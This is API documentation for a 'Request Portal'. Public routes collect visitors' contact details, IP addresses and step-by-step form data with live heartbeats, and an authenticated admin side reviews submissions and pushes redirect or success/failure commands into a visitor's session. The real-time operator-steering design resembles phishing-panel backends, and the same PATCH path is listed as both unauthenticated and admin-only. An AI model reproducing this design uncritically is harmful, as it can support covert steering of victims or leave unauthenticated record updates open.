# Request Portal API Routes

Base URL: `/api/requests`

## Public Routes (No Auth Required)

### POST /submit
Create or upsert a request (initial submission).

**Request:**
```json
{
  "id": "req-abc123...",
  "visitor_email": "visitor@example.com",
  "visitor_phone": "1234567890",
  "visitor_name": "John Doe",
  "current_step": 1,
  "current_page": "step-1",
  "last_seen": 1712345678000,
  "source": "web",
  "country": "US",
  "user_agent": "Mozilla/5.0...",
  "ip_address": "192.168.1.1"
}
```

**Response:**
```json
{ "ok": true, "id": "req-abc123..." }
```

---

### PATCH /submissions/:id
Update request data (heartbeat + form updates).

**Request:**
```json
{
  "current_step": 2,
  "current_page": "step-2",
  "step_1_data": { "field1": "value1" },
  "last_seen": 1712345679000
}
```

**Response:**
```json
{ "ok": true }
```

---

### GET /cmd/:id
Poll for admin commands (non-blocking).

**Response:**
```json
{
  "cmd": "redirect:step-3" | "action:approve" | null
}
```

**Behavior:**
- Returns command if any queued
- Clears command after returning
- Returns null if no command

---

### GET /heartbeat/:id
Send heartbeat + get live status.

**Response:**
```json
{
  "is_live": true,
  "last_updated": 1712345680000
}
```

---

## Admin Routes (Requires Auth)

All admin routes require valid session cookie (`admin_session`).

### GET /submissions
List all requests with filters.

**Query Parameters:**
- `status`: pending | submitted | under_review | approved | rejected | completed
- `assigned_to`: admin email
- `limit`: 50 (default)
- `offset`: 0 (default)
- `sort`: created_at_ts (default) | last_seen | status

**Response:**
```json
{
  "data": [
    {
      "id": "req-abc123...",
      "visitor_email": "visitor@example.com",
      "visitor_name": "John Doe",
      "current_step": 2,
      "status": "under_review",
      "created_at_ts": 1712345678000,
      "last_seen": 1712345680000,
      "is_live": true,
      "assigned_to": "admin@example.com"
    }
  ],
  "total": 150,
  "limit": 50,
  "offset": 0
}
```

---

### GET /submissions/:id
Get full request details.

**Response:**
```json
{
  "id": "req-abc123...",
  "visitor_email": "visitor@example.com",
  "visitor_phone": "1234567890",
  "visitor_name": "John Doe",
  "current_step": 2,
  "status": "under_review",
  "step_1_data": { "field1": "value1" },
  "step_2_data": { "field2": "value2" },
  "admin_notes": "Pending verification",
  "assigned_to": "admin@example.com",
  "created_at_ts": 1712345678000,
  "last_seen": 1712345680000,
  "is_live": false
}
```

---

### PATCH /submissions/:id
Update request status/notes (admin action).

**Request:**
```json
{
  "status": "approved",
  "admin_notes": "Verified and approved",
  "assigned_to": "admin@example.com"
}
```

**Response:**
```json
{ "ok": true }
```

---

### POST /cmd/:id
Send command to visitor.

**Request:**
```json
{
  "cmd": "redirect:step-3" | "action:success" | "action:failed"
}
```

**Response:**
```json
{ "ok": true }
```

**Commands:**
- `redirect:step-1` / `redirect:step-2` / `redirect:step-3`
- `action:approve` / `action:reject`
- `action:success` / `action:failed`

---

### DELETE /submissions/:id
Delete a request.

**Response:**
```json
{ "ok": true }
```

---

### GET /activity/:id
Get activity log for a request.

**Response:**
```json
{
  "data": [
    {
      "id": "log-123...",
      "action": "created",
      "admin_id": null,
      "details": {},
      "created_at": "2024-04-01T12:00:00Z"
    },
    {
      "id": "log-456...",
      "action": "status_changed",
      "admin_id": "admin-123...",
      "details": { "from": "pending", "to": "under_review" },
      "created_at": "2024-04-01T12:05:00Z"
    }
  ]
}
```

---

## Admin Auth Routes

### POST /admin/login
Login with email + password.

**Request:**
```json
{
  "email": "admin@example.com",
  "password": "secure_password"
}
```

**Response:**
```json
{
  "ok": true,
  "admin": {
    "id": "admin-123...",
    "email": "admin@example.com",
    "full_name": "Jane Smith",
    "role": "admin"
  }
}
```

**Side Effect:** Sets `admin_session` cookie (24-hour TTL, HMAC-signed)

---

### POST /admin/logout
Logout (clear session cookie).

**Response:**
```json
{ "ok": true }
```

---

### GET /admin/me
Get current admin session info.

**Response:**
```json
{
  "id": "admin-123...",
  "email": "admin@example.com",
  "full_name": "Jane Smith",
  "role": "admin",
  "can_approve": true,
  "can_reject": true,
  "can_send_commands": true,
  "can_delete": false
}
```

---

### POST /admin/users (Admin only)
Create new admin user.

**Request:**
```json
{
  "email": "newadmin@example.com",
  "password": "initial_password",
  "full_name": "New Admin",
  "role": "reviewer"
}
```

**Response:**
```json
{
  "ok": true,
  "user": {
    "id": "admin-456...",
    "email": "newadmin@example.com",
    "full_name": "New Admin",
    "role": "reviewer"
  }
}
```

---

## Health Check

### GET /health
Simple health check (no auth).

**Response:**
```json
{
  "status": "ok",
  "timestamp": "2024-04-01T12:00:00Z"
}
```

---

## Error Responses

All endpoints can return errors:

```json
{
  "error": "Error message",
  "code": "INVALID_REQUEST" | "UNAUTHORIZED" | "NOT_FOUND" | "SERVER_ERROR"
}
```

**HTTP Status Codes:**
- `200` OK
- `400` Bad Request
- `401` Unauthorized
- `403` Forbidden
- `404` Not Found
- `500` Server Error
